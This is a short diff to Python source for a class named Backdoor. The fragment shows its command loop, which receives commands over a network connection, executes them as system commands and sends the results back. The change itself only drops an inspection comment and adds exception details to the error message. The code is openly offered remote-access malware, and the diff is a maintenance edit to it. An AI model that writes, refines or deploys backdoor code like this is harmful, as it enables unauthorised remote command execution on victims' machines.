@@ -49,7 +49,6 @@ class Backdoor:
         while True:
             command = self.reliable_receive()
 
-            # noinspection PyBroadException
             try:
                 if command[0] == "exit":
                     self.connection.close()
@@ -63,8 +62,8 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(command).decode()
 
-            except Exception:
-                command_result = "[-] Error during command execution"
+            except Exception as e:
+                command_result = f"[-] Error during command execution: {e}"
 
             self.reliable_send(command_result)
 
